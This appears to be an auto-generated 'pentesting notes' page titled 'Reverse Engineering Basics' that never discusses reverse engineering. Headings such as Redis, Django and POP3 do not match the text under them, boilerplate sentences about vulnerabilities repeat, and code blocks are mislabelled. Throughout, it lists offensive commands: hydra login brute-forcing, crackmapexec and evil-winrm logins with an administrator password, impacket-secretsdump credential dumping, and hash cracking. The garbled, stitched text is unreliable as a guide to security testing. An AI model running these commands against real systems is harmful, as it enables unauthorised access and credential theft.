---
TitleSEO: "Reverse Engineering Basics | ZureFX"
TitlePost: "Reverse Engineering Basics"
Author: "ZureFX"
Description: "Personal notes on Reverse Engineering Basics. Quick reference for pentesting and CTF challenges."
Keywords: "linux, lateral movement, malware, blue team, networking"
URL: "https://zurefx.github.io/notes/note-reverse-engineering-basics-673.html"
URL_IMAGES: ""
Date: "2024-09-01"
Tags: "Linux, Lateral Movement, Malware, Blue Team, Networking"
Section: "notes"
Lang: "en"
main_img: "note-reverse-engineering-basics-673"
Permalink: "/notes/note-reverse-engineering-basics-673.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Redis

### nmap

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
feroxbuster -h
feroxbuster -h
crackmapexec smb 10.79.224.133 -u administrator -p 'P@ssw0rd!' --shares
```

## bloodhound

### Django

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.8.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.118.55.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.12.160.242
feroxbuster -h
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.225.181/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.200.45 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Path Traversal

### SUID Binary

> **Note:** XXE was identified as the primary attack vector in this scenario.

- `Subdomain Takeover`
- `Resource-Based Constrained Delegation`
- `Remote Code Execution`
- `Command Injection`

```powershell
crackmapexec smb 10.21.75.190 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.40.178.241 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.73.11 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

## Nginx

### impacket

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.201.104
nmap -sCV -p8443,5985,443 10.125.123.236 -oN scan.txt
crackmapexec smb 10.119.162.116 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## POP3

### SMB

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

> **Note:** CSRF was identified as the primary attack vector in this scenario.

```bash
evil-winrm -i 10.68.114.49 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p8888,27017,8080 10.32.16.152 -oN scan.txt
crackmapexec smb 10.35.163.1 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.
